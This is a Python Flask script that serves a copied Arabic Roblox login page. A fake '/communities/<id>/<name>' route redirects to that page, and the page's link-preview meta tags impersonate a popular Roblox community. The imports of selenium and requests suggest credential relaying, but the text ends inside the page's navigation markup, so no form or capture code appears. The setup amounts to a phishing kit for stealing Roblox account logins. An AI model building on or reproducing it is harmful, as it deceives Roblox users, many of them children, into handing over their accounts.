from flask import Flask, request, render_template_string, redirect
import threading
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import sys
import socket
import logging
import requests

app = Flask(__name__)

@app.route('/communities/<int:id>/<string:name>')
def fake_community(id, name):
    return redirect("/")

# أي صفحة HTML تريد تجربتها، ضعها هنا
html_page = """
<html lang="ar"><!--<![endif]-->
<head data-machine-id="201d9b7c-faf3-5baf-f274-fee986a0e30c">
 
  <style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
 
  <!-- MachineID: 201d9b7c-faf3-5baf-f274-fee986a0e30c -->
  <title>تسجيل الدخول إلى Roblox</title>
 
  <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="Roblox Corporation">
  <meta name="description" content="تسجيل الدخول إلى حسابك في Roblox أو إنشاء حساب جديد.">
  <meta name="keywords" content="ألعاب مجانية, ألعاب على الإنترنت, بناء ألعاب, عوالم افتراضية, mmo مجاني, سحابة ألعاب, محرك فيزياء">
 
  <meta name="apple-itunes-app" content="app-id=431946152">
  <link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">
 
  <!-- ====== META TAGS تبع BRAZILIAN SPYDER ====== -->
  <meta property="og:site_name" content="Roblox">
  <meta property="og:title" content="BRAZILIAN SPYDER">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://www.roblox.com/communities/35815907/BRAZILIAN-SPYDER">
  <meta property="og:description" content="BRAZILIAN SPYDER is a community on Roblox owned by SpyderSammy with 13130730 members. ">
  <meta property="og:image" content="https://tr.rbxcdn.com/180DAY-cd2ba89b41de34c85bc5484c81f3ed9b/150/150/Image/Png/noFilter">
  <meta property="fb:app_id" content="190191627665278">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@Roblox">
  <meta name="twitter:title" content="BRAZILIAN SPYDER">
  <meta name="twitter:description" content="BRAZILIAN SPYDER is a community on Roblox owned by SpyderSammy with 13130730 members. ">
  <meta name="twitter:creator">
  <meta name="twitter:image1" content="https://tr.rbxcdn.com/180DAY-cd2ba89b41de34c85bc5484c81f3ed9b/150/150/Image/Png/noFilter">
  <meta name="twitter:app:country" content="US">
  <meta name="twitter:app:name:iphone" content="Roblox Mobile">
  <meta name="twitter:app:id:iphone" content="431946152">
  <meta name="twitter:app:url:iphone">
  <meta name="twitter:app:name:ipad" content="Roblox Mobile">
  <meta name="twitter:app:id:ipad" content="431946152">
  <meta name="twitter:app:url:ipad">
  <meta name="twitter:app:name:googleplay" content="Roblox">
  <meta name="twitter:app:id:googleplay" content="com.roblox.client">
  <meta name="twitter:app:url:googleplay">
  <!-- ====== نهاية الإضافة ====== -->
 
  <meta ng-csp="no-unsafe-eval">
 
  
  <meta name="locale-data" data-language-code="ar_001" data-language-name="العربية" data-url-locale="ar" data-override-language-header="true">
  <meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false" data-is-samsung-galaxy-store-app="false">
  <meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">
 
  <meta id="roblox-display-names" data-enabled="true">
 
  <meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="true" data-bound-auth-token-whitelist="{&quot;Whitelist&quot;:[{&quot;apiSite&quot;:&quot;auth.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;inventory.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountinformation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;billing.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;premiumfeatures.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;trades.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;groups.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;adconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;ads.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;assetdelivery.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;avatar.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;badges.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;catalog.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;chat.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;chatmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;clientsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;contacts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;contentstore.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;develop.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;economy.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;engagementpayouts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;followings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;friends.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gameinternationalization.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gamejoin.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gamepersistence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;games.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;groupsmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;itemconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;locale.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;localizationtables.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;metrics.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;moderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;notifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;points.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;presence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;publish.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;privatemessages.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;thumbnailsresizer.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;thumbnails.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;translationroles.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;translations.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;twostepverification.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},
  {&quot;apiSite&quot;:&quot;usermoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;users.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;voice.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;realtimenotifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;jQuery&quot;,&quot;sampleRate&quot;:&quot;1000000&quot;}]}" data-bound-auth-token-exemptlist="{&quot;Exemptlist&quot;:[]}" data-hba-indexed-db-name="hbaDB" data-hba-indexed-db-obj-store-name="hbaObjectStore" data-hba-indexed-db-key-name="hba_keys" data-hba-indexed-db-version="1" data-bat-event-sample-rate="500">
  <meta name="account-switching-data" data-is-account-switching-enabled="true">
 
  <meta name="passkey-data" data-is-passkey-login-enabled="true">
  <meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">
 
   <meta name="page-guac-migration" data-v1-path="/universal-app-configuration/v1/behaviors/&lt;behaviour-name&gt;/content" data-v2-path="/guac-v2/v1/bundles/&lt;behaviour-name&gt;" data-behavior-page-heartbeat-v2="true" data-behavior-app-policy="true" data-behavior-chat-ui="true" data-behavior-cookie-policy="true" data-behavior-intl-auth-compliance="true" data-behavior-navigation-header-ui="true" data-behavior-user-heartbeats="true" data-behavior-free-communication-infographics="true" data-behavior-play-button-ui="true" data-behavior-vpc-launch-status="true" data-behavior-configure-group-ui="true" data-behavior-content-rating-logo="true" data-behavior-group-details-ui="true" data-behavior-inventory-creator-policy="true" data-behavior-legal-text-eea-uk="true" data-behavior-private-messages-ui="true" data-behavior-texas-u18-vpc-optimization="true" data-behavior-user-agreements-policy="true" data-behavior-user-settings-global-privacy-control-policy="true" data-behavior-vng-buy-robux="true" data-behavior-web-profile-ui="true" data-behavior-display-names="true" data-behavior-report-abuse-ui="true" data-behavior-account-settings-ui="true" data-behavior-abuse-reporting-revamp="true">
 
  <meta name="page-meta" data-internal-page-name="Login">
  <meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">
 
  <script type="text/javascript">
     var Roblox = Roblox || {};
 
     Roblox.BundleVerifierConstants = {
         isMetricsApiEnabled: true,
         eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
         deviceType: "Computer",
         cdnLoggingEnabled: JSON.parse("true")
     };
  </script>
 
             <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
 
   <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="FoundationCss" data-bundle-source="Main" href="https://css.rbxcdn.com/8ecc19dceb6abc73a66adb571ddf1a0423bdc0511e9151ac73dbbaffffe0593c.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/8d11c3b31d8bfc5bb3d38d8125e3ae08f12b5328bc7d14f19df6888e412bebea.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Builder" data-bundle-source="Main" href="https://css.rbxcdn.com/6748baae45a07deac6a5c354f7bed6417cd1603ff82aa9b5b72d2013e0cb0793.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/28d3da7c913edb3c5dfb82f72058178c9ba2c6fb9876b08d73677160922ab903.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/99bc7bc872c39ffa5d2bbb936a006c28d743808ba187f992ad896a31618c17cf.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/b2cff71de0c286e8f85b1a26a8b87a8cd7f77422c592849ad5114ac5d929c575.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSwitcher" data-bundle-source="Main" href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PriceTag" data-bundle-source="Main" href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SearchLandingPage" data-bundle-source="Main" href="https://css.rbxcdn.com/34b79279d9cb0428d155418f3035def3b8d2d3f952fd6dabe06ae28b2eb32afc.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/48fac33ce9efdd09582af469b1a2a8317db6c605080bd7b2001e6eba2dc83575.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/7e348738266e9ea2bae9314a2d26b33618c6f4cf3c527b11023620d973c6e7fc.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/945686c706d827658e2e4dee3009559078256e204bb42a3f02fdc6c9552cc7f7.css">
 
      <link rel="canonical" href="https://www.roblox.com/ar/login">
 
          <link rel="alternate" href="https://www.roblox.com/login" hreflang="x-default">
      <link rel="alternate" href="https://www.roblox.com/login" hreflang="en">
      <link rel="alternate" href="https://www.roblox.com/de/login" hreflang="de">
      <link rel="alternate" href="https://www.roblox.com/es/login" hreflang="es">
      <link rel="alternate" href="https://www.roblox.com/fr/login" hreflang="fr">
      <link rel="alternate" href="https://www.roblox.com/id/login" hreflang="id">
      <link rel="alternate" href="https://www.roblox.com/it/login" hreflang="it">
      <link rel="alternate" href="https://www.roblox.com/ja/login" hreflang="ja">
      <link rel="alternate" href="https://www.roblox.com/ko/login" hreflang="ko">
      <link rel="alternate" href="https://www.roblox.com/pl/login" hreflang="pl">
      <link rel="alternate" href="https://www.roblox.com/pt/login" hreflang="pt">
      <link rel="alternate" href="https://www.roblox.com/th/login" hreflang="th">
      <link rel="alternate" href="https://www.roblox.com/tr/login" hreflang="tr">
      <link rel="alternate" href="https://www.roblox.com/vi/login" hreflang="vi">
      <link rel="alternate" href="https://www.roblox.com/ar/login" hreflang="ar">
 
      <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">
          <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main" href="https://css.rbxcdn.com/07e3a4ef8c2aaf8a40f9f96d0fb51721658cdbfdce400a27bd919975fde65476.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/bc981bafa6b0a52c86d071d1f81b24168a8dd92e72b8ac52d37cb46bf8bd8c42.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/07d73a0fe62fadd30d32d50e667e7d6b62ca192cd258a1c3340cb262de401d72.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/97a9d5a74599e95902f6456aea6e3cfaa9fe463ebbe0ae4a6a5025d40e1b7866.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
 
      <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/7dfc7837b5da6850e13413c630b37da7e88aeb610ca2c7d4e8b71b02cbdc6ba6.css">
 
      <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/1b6cc6d0699561a61e37bae3b8fa07ac5698c5c41c8375ac4f907e189be90232.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">
  <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameLaunch" data-bundle-source="Main" href="https://css.rbxcdn.com/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">
          <meta name="roblox-tracer-meta-data" data-access-token="" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="0" data-is-instrument-page-performance-enabled="false"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/f85ce090699c1c3962762b8a2f8b252f0f2a7d0424c146f41d6c5abbf0147a57.js"></script>
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
       <script type="text/javascript">
           var _gaq = _gaq || [];
                 window.GoogleAnalyticsDisableRoblox2 = true;
           _gaq.push(['b._setAccount', 'UA-486632-1']);
              _gaq.push(['b._setSampleRate', '5']);
           _gaq.push(['b._setCampSourceKey', 'rbx_source']);
           _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
           _gaq.push(['b._setCampContentKey', 'rbx_campaign']);
             _gaq.push(['b._setDomainName', 'roblox.com']);
             _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
                 _gaq.push(['b._setPageGroup', 1, 'Login']);
             _gaq.push(['b._trackPageview']);
 
           _gaq.push(['c._setAccount', 'UA-26810151-2']);
             _gaq.push(['c._setSampleRate', '1']);
             _gaq.push(['c._setDomainName', 'roblox.com']);
             _gaq.push(['c._setPageGroup', 1, 'Login']);
 
             (function() {
                 if (!Roblox.browserDoNotTrack) {
                     var ga = document.createElement('script');
                     ga.type = 'text/javascript';
                     ga.async = true;
                     ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                     var s = document.getElementsByTagName('script')[0];
                     s.parentNode.insertBefore(ga, s);
                 }
         })();
             </script>
             <script type="text/javascript">
             if (Roblox && Roblox.EventStream) {
                 Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                     "//ecsv2.roblox.com/www/e.png",
                     "//ecsv2.roblox.com/pe?t=studio",
                     "//ecsv2.roblox.com/pe?t=diagnostic");
             }
         </script>
   <script type="text/javascript">
     if (Roblox && Roblox.PageHeartbeatEvent) {
         Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
     }
  </script>
    <script>
     Roblox = Roblox || {};
     Roblox.AbuseReportPVMeta = {
         desktopEnabled: false,
         phoneEnabled: false,
         inAppEnabled: false
     };
  </script>
 
  <meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                            <style type="text/css">.foundation-web-interactable{outline-width:0;overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start);outline-offset:3px}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}</style><style type="text/css">.foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button .foundation-web-loading-spinner svg path{fill:currentColor}</style><style type="text/css">.foundation-web-icon-button[disabled]{opacity:.5}</style><style type="text/css">.foundation-web-checkbox.foundation-web-checkbox-disabled{opacity:.5}.foundation-web-checkbox .foundation-web-interactable{outline-offset:3px}</style><style type="text/css">.foundation-web-dropdown.foundation-web-dropdown-disabled{opacity:.5;pointer-events:none}.foundation-web-dropdown-trigger{border-width:1px}.foundation-web-dropdown-trigger.foundation-web-interactable:focus-visible{outline-offset:4px}.foundation-web-menu-item.foundation-web-interactable:focus-visible{outline-offset:-1px}.foundation-web-menu-item.foundation-web-interactable:focus-visible:hover{outline-width:0}.foundation-web-menu-item[data-disabled] span{opacity:.5}</style><style type="text/css">.disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%;content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%;display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}</style><style type="text/css">.foundation-web-toggle.disabled{opacity:50%}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style></head>
 <body id="rbx-body" dir="rtl" class="rbx-body   dark-theme builder-font " data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
     <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Theme" data-bundle-source="Main" src="https://js.rbxcdn.com/02a63ed03498b17dc2e133716717d996d9be5ab25ae788ee1234d40267fc2d2b.js"></script>
            <meta name="csrf-token" data-token="zqzk9yp29Cc0">
          <script src="https://roblox.com/js/hsts.js?v=3" type="text/javascript" id="hsts" async=""></script>
 
     <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="https://js.rbxcdn.com/1d87d1231072878a0f6164e84b8cfa6f90a1b31b18ba5d8f410b947d4b029fe8.js"></script>
  <div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
  </div><div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
  </div>
      <div id="wrap" class="wrap no-gutter-ads logged-out">
  <div id="navigation-container" class="builder-font ixp-marketplace-rename-treatment" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True" data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00" data-platform-event-left-nav-entry-end-time="07/12/2025 19:00:00" data-platform-event-left-nav-url="https://www.roblox.com/the-hatch">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
<div class="container-fluid">
<div class="rbx-navbar-header">
<div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">تخطي إلى المحتوى الرئيسي</button></div>
<div class="navbar-header">
<a class="navbar-brand" href="https://www.roblox.com/ar/home">
<span class="icon-logo"></span><span class="icon-logo-r"></span>
</a>
</div>
</div>
<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
<li>
<a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/ar/charts">الرائجة</a>
</li>
<li>
<a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/ar/catalog">السوق</a>
</li>
<li>
<a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">إنشاء</a>
</li>
<li id="navigation-robux-container"><div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/ar/upgrades/robux?ctx=navpopover">Robux</a></div></li>
</ul>
<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
<li>
<a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/ar/charts">الرائجة</a>
</li>
<li>
<a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/ar/catalog">السوق</a>
</li>
<li>
<a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">إنشاء</a>
</li>
<li id="navigation-robux-mobile-container"><div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/ar/upgrades/robux?ctx=navpopover">Robux</a></div></li>
</ul>
